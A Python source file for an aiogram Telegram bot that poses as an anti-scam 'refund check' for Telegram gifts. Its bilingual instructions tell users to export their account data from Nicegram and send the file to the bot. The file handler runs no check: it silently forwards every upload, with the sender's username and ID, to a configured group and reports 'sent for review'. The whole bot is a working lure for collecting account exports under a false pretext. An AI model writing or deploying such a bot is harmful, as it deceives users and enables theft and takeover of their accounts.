from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from keyboards import main_kb, main_kb_en, lang_kb
import os

router = Router()

GROUP_ID = int(os.getenv("GROUP_ID")) if os.getenv("GROUP_ID") else None

# ---------- Хранилище языка ----------
USER_LANG = {}  # user_id: "ru" | "en"


def get_lang(user_id: int) -> str:
    return USER_LANG.get(user_id, "ru")


# ---------- Универсальный ответ с фото ----------
async def answer_with_photo(
    msg: Message,
    text: str,
    reply_markup=None,
    parse_mode="HTML"
):
    base_dir = os.path.dirname(os.path.abspath(__file__))
    photo_path = os.path.join(base_dir, "welcome.jpg")

    photo = FSInputFile(photo_path)

    await msg.answer_photo(
        photo=photo,
        caption=text,
        reply_markup=reply_markup,
        parse_mode=parse_mode
    )


# ---------- /start ----------
@router.message(F.text == "/start")
async def start(msg: Message):
    await answer_with_photo(
        msg,
        "🌍 Choose your language / Выберите язык:",
        reply_markup=lang_kb
    )


# ---------- Выбор языка ----------
@router.callback_query(F.data.startswith("lang_"))
async def choose_lang(call: CallbackQuery):
    lang = call.data.split("_")[1]
    user_id = call.from_user.id
    USER_LANG[user_id] = lang

    await call.answer()
    await call.message.delete()

    if lang == "ru":
        text = (
            "Привет! 👋 Я — бот, который поможет тебе не попасться на мошенников.\n\n"
            "⚡ Я помогу отличить реальный подарок от фейкового.\n"
            "📂 Чистый подарок — без рефаунда.\n"
            "❌ Отмеченный — деньги уже возвращали.\n\n"
            "Выбери действие ниже:"
        )
        kb = main_kb
    else:
        text = (
            "Hello! 👋 I’m a bot that helps you avoid scammers.\n\n"
            "⚡ I help you distinguish a real gift from a fake one.\n"
            "📂 Clean gift — no refund history.\n"
            "❌ Marked gift — already refunded.\n\n"
            "Choose an action below:"
        )
        kb = main_kb_en

    await answer_with_photo(call.message, text, reply_markup=kb)


# ---------- Инструкция ----------
@router.message(F.text.in_(["📘 Инструкция", "📘 Instructions"]))
async def instruction(msg: Message):
    lang = get_lang(msg.from_user.id)

    if lang == "ru":
        text = (
    "📘 <b>Инструкция</b>\n\n"
    "<blockquote>1️⃣ Скачайте приложение <b>Nicegram</b>.</blockquote>\n\n"
    "<blockquote>2️⃣ Войдите в свой аккаунт.</blockquote>\n\n"
    "<blockquote>3️⃣ Откройте <b>Настройки → Nicegram</b>.</blockquote>\n\n"
    "<blockquote>4️⃣ Экспортируйте данные аккаунта.</blockquote>\n\n"
    "<blockquote>5️⃣ Нажмите <b>Проверка на Refund</b>.</blockquote>\n\n"
    "<blockquote>6️⃣ Отправьте файл боту.</blockquote>\n\n"
    "<blockquote>🌐 <a href='https://nicegram.app'>nicegram.app</a></blockquote>"
)

    else:
        text = (
    "📘 <b>Instructions</b>\n\n"
    "<blockquote>1️⃣ Download the <b>Nicegram</b> app.</blockquote>\n\n"
    "<blockquote>2️⃣ Log in to your account.</blockquote>\n\n"
    "<blockquote>3️⃣ Open <b>Settings → Nicegram</b>.</blockquote>\n\n"
    "<blockquote>4️⃣ Export account data.</blockquote>\n\n"
    "<blockquote>5️⃣ Tap <b>Refund Check</b>.</blockquote>\n\n"
    "<blockquote>6️⃣ Send the file to the bot.</blockquote>\n\n"
    "<blockquote>🌐 <a href='https://nicegram.app'>nicegram.app</a></blockquote>"
)

    await answer_with_photo(msg, text)


# ---------- Скачать ----------
@router.message(F.text.in_(["⬇️ Скачать Nicegram", "⬇️ Download Nicegram"]))
async def download(msg: Message):
    lang = get_lang(msg.from_user.id)

    if lang == "ru":
        text = (
    "🚀 <b>Установка Nicegram</b>\n\n"
    "<blockquote>🌐 <a href='https://nicegram.app'>Официальный сайт</a></blockquote>\n\n"
    "<blockquote>🤖 <a href='https://play.google.com/store/apps/details?id=app.nicegram'>Google Play</a></blockquote>\n\n"
    "<blockquote>🍏 <a href='https://apps.apple.com/us/app/nicegram-ai-x-dual-telegram/id1608870673'>App Store</a></blockquote>"
)

    else:
        text = (
    "🚀 <b>Install Nicegram</b>\n\n"
    "<blockquote>🌐 <a href='https://nicegram.app'>Official website</a></blockquote>\n\n"
    "<blockquote>🤖 <a href='https://play.google.com/store/apps/details?id=app.nicegram'>Google Play</a></blockquote>\n\n"
    "<blockquote>🍏 <a href='https://apps.apple.com/us/app/nicegram-ai-x-dual-telegram/id1608870673'>App Store</a></blockquote>"
)


    await answer_with_photo(msg, text)


# ---------- Проверка ----------
@router.message(F.text.in_(["🔍 Проверка на Refund", "🔍 Refund Check"]))
async def check(msg: Message):
    lang = get_lang(msg.from_user.id)

    text = (
        "📂 Отправьте файл из Nicegram"
        if lang == "ru"
        else "📂 Send the file from Nicegram"
    )

    await answer_with_photo(msg, text)


# ---------- Файлы ----------
@router.message(F.document)
async def handle_file(msg: Message):
    if not GROUP_ID:
        await answer_with_photo(msg, "❌ GROUP_ID not set")
        return

    await msg.bot.send_document(
        chat_id=GROUP_ID,
        document=msg.document.file_id,
        caption=(
            f"📥 New file\n"
            f"👤 @{msg.from_user.username or msg.from_user.id}\n"
            f"🆔 ID: {msg.from_user.id}"
        )
    )

    lang = get_lang(msg.from_user.id)
    text = (
        "✅ Файл отправлен на проверку"
        if lang == "ru"
        else "✅ File sent for review"
    )

    await answer_with_photo(msg, text)
